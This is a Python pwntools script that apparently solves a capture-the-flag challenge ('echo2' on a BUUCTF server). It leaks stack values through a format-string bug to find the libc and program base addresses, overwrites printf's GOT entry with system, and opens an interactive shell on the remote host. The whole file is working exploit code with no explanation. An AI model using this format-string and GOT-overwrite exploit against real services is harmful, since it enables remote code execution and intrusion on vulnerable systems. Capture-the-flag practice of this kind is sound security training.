from pwn import *

#context.log_level = 'debug'
context.bits = 64
context.arch = 'amd64'

#p = process('./echo2')
p = remote('node4.buuoj.cn', 28695)
elf = ELF('echo2')
libc = ELF('libc-2.23.buu.so')

def debug(s):
	gdb.attach(p, '''
		source ~/libc/loadsym.py
		loadsym ~/libc/2.23/64/libc-2.23.debug.so
	''' + s)

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

#debug('b *$rebase(0x984)')

payload = b'%30$p,,,%34$p'
sl(payload)

libc_base = int(rv(14), 16) - libc.sym['_IO_2_1_stdout_']
success('libc_base -> {}'.format(hex(libc_base)))
ru(b',,,')
proc_base = int(rv(14), 16) - elf.sym['_start']
success('proc_base -> {}'.format(hex(proc_base)))

printf_got = proc_base + elf.got['printf']
system = libc_base + libc.sym['system']

payload = fmtstr_payload(6, { printf_got: system })
sl(payload)
p.recv()
p.recv()

p.interactive()
